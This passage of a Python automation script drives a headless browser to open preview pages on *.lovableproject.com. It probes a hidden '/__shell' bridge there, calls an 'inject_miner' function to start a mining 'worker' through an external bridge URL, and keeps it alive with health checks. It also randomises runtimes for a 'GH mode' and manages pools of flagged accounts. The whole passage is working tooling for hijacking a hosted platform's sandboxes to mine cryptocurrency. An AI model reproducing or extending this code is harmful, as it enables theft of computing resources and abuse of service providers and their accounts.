                    print("   📑 creating preview page...")
                    preview_page = await context.new_page()
                    print("   ✅ preview page created")
                    await _open_preview(preview_page)
                print(f"✅ Preview ready: {preview_page.url[:120]}")
            except Exception as e:
                print(f"⚠️  Preview open failed ({str(e)[:100]})")
                if preview_page is None:
                    preview_page = chat_page if skip_chat else await context.new_page()
                print("   🔄 retry goto *.lovableproject.com ...")
                await _open_preview(preview_page)
                print(f"✅ Preview ready: {preview_page.url[:120]}")
            print(f"🌐 preview URL now: {preview_page.url}")
            
            # 10. Probe /__shell on the preview page itself (main frame).
            max_retries = 3
            console_ready = False
            for attempt in range(max_retries):
                print(f"\n🔍 Probing shell bridge (attempt {attempt+1}/{max_retries})...")
                try:
                    r = await asyncio.wait_for(
                        shell_exec_preview(preview_page, "pwd", skip_main=False),
                        timeout=120,
                    )
                    if r and r.get("code") == 0:
                        print(f"✅ Shell bridge ready: {r.get('stdout','').strip()}")
                        console_ready = True
                        break
                    print(f"   ⚠️  Shell returned: {r}")
                except Exception as e:
                    print(f"   ⚠️  Shell bridge unavailable: {e}")

                if attempt < max_retries - 1:
                    print(f"🔄 re-goto *.lovableproject.com (attempt {attempt+1})...")
                    await asyncio.sleep(10)
                    await _open_preview(preview_page)

            if not console_ready:
                print("❌ Shell bridge never became available - giving up")
                if args.mode == "oneshot":
                    return
            
            # 11. Start worker
            print("\n⚙️ Starting worker...")
            success = await inject_miner(preview_page, BRIDGE_URL, args.threads)
            print(f"🌐 preview URL after inject: {preview_page.url} (success={success})")
            
            if not success:
                print("❌ Worker start failed")
                if args.mode == "oneshot":
                    return
            
            print("\n✅ Worker is running!")
            
            # 12. Health check loop (refresh every 3min, check for errors)
            print(f"\n🏥 Starting health check ({args.mode} mode)...")
            
            max_runtime = None
            if args.mode == "gh":
                import random as _random
                max_runtime = _random.uniform(280, 330)
                print(f"⏰ GH mode: will stop after {max_runtime:.1f} minutes")
            
            # Oneshot = keep checking until preview stops loading (error on page), then end
            await health_check_loop(preview_page, preview_url, mode=args.mode, bridge_url=BRIDGE_URL, context=context, max_runtime_minutes=max_runtime)
            print("\n🏁 Session complete!")
    finally:
        # Release the account (never leave it on_hold) - but NEVER un-flag red/truly_red
        cur_status = db.get_session(session_id)
        if cur_status and cur_status.get("status") in ("red", "truly_red"):
            print(f"⚠️  Session {session_id} is {cur_status.get('status')} - not restoring to active")
        else:
            db.update_session(session_id, status="active")
            save_db(db)
            print(f"✅ Session {session_id} released back to 'active'")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️  Interrupted by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Hard kill - never leave the process/browser hanging
        print("\n💥 Exiting process")
        os._exit(0)
